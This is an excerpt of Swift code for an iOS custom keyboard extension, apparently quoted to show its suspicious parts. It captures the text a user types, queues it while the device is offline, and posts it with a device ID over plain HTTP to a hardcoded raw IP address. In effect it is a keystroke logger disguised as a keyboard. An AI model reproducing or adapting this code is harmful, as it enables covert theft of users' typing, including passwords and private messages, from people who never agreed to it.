...
class KeyboardViewController: UIInputViewController {
    ...
    */
    ...
    override func viewDidAppear(_ animated: Bool) {
        ...
        if Connectivity.isConnectedToInternet == true {
            ...
            if (UserDefaults.standard.value(forKey: NO_INTERNET) as? String) != nil {
                ...
                UserDefaults.standard.set(localString, forKey: TEXT_TO_UPLOAD)
            }
        }
    }
    func postAction(_ text:String) {
        let Url = String(format: "http://199.247.5.247:8003/addKeyboardKeyword")
        guard let serviceUrl = URL(string: Url) else { return }
        let parameterDictionary = ["deviceId" : "\(deviceID)", "keyword" : "\(text)"]
        var  jsonData = NSData()
        do {
            jsonData = try JSONSerialization.data(withJSONObject: parameterDictionary, options: .prettyPrinted) as NSData
        } catch {
    ...
    func postAction1(_ text:String) {
...
//        self.bannerView?.frame = CGRect(x: 0, y: 0, width: self.view.bounds.width, height: metric("topBanner"))
        self.bannerView?.frame = CGRect(x: 0, y: 0, width: self.view.bounds.width, height: 0)
   ...
   @objc func highlightKey(_ sender: KeyboardKey) {
    ...
    @objc func keyPressedHelper(_ sender: KeyboardKey) {
        if let model = self.layout?.keyForView(sender) {
            ...
            self.GenerateOutput(model.uppercaseKeyCap!)
    ...
    func GenerateOutput(_ key:String) {
       switch key {

        case "space":
            keystoreString = self.textDocumentProxy.documentContextBeforeInput!
      //      completeText = keystoreString
